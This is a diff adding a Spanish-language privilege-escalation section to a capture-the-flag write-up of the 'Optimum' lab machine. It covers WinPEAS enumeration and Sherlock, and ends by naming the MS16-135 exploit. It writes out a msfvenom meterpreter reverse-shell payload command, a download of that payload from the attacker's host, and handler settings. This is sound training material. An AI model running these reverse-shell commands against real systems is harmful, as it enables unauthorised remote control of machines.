@@ -74,3 +74,47 @@ optimum\kostas
 
 <br>
 **Escalada de privilegios**
+
+Para comenzar a enumerar posibles vectores de escalada de privilegios hemos ejecutado la herramienta <a href="https://github.com/peass-ng/PEASS-ng">WinPEAS</a>. Tras ejecutar la herramienta apreciamos información interesante como por ejemplo la credencial en texto plano del usuario kostas.
+
+![image-left](https://haoxgit.github.io/haox/assets/images/optimum/user.png){: .align-center}
+
+Algo de lo que deberíamos de darnos cuenta es de que la herramienta Watson no muestra ninguna salida al ejecutar WinPEAS.
+
+Esto se debe a que la versión .NET del host no permite el uso de Watson (se necesita como mínimo la versión 4.5). Para comprobarlo podemos consultar los directorios de la siguiente ruta
+
+![image-left](https://haoxgit.github.io/haox/assets/images/optimum/net.png){: .align-center}
+
+Lo que debemos de hacer en casos como este es recurrir a su predecesor <a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a>
+
+En mi caso me econtre un error ya que la shell que nos ha propocionado el exploit de HttpFileServer no es lo suficientemente estable. Como bypass de este problema podemos generar una shell meterpreter desde nuestra máquina atacante.
+```
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o met.exe
+```
+
+Para compartir la shell podemos ejecutar un servidor http con python
+```
+python3 -m http.server 80
+```
+
+Aprovechando la shell PS que ya tenemos descargamos sherlock del siguiente modo
+```
+iwr -uri http http://10.10.14.5/met.exe -outfile met.exe
+```
+
+Por parte de nuestra maquina atacante a la escucha deberemos de utilizar el multi/handler de msfconsole y definir los siguientes parámetros.
+```
+set lhost <IP de nuestra máquina atacante>
+
+set lport <puerto a la escuhca de nuestra máquina atacante>
+
+set payload windows/x64/meterpreter_reverse_https
+```
+
+Tras esto obtendremos una shell estable desde la cual podremos ejecutar la herramienta Sherlock. 
+
+![image-left](https://haoxgit.github.io/haox/assets/images/optimum/Sherlock.png){: .align-center}
+
+Para explotar las vulnerabilidades encontradas he decidido utilizar el exploit MS16-135.
+![image-left](https://haoxgit.github.io/haox/assets/images/optimum/exploit.png){: .align-center}
+
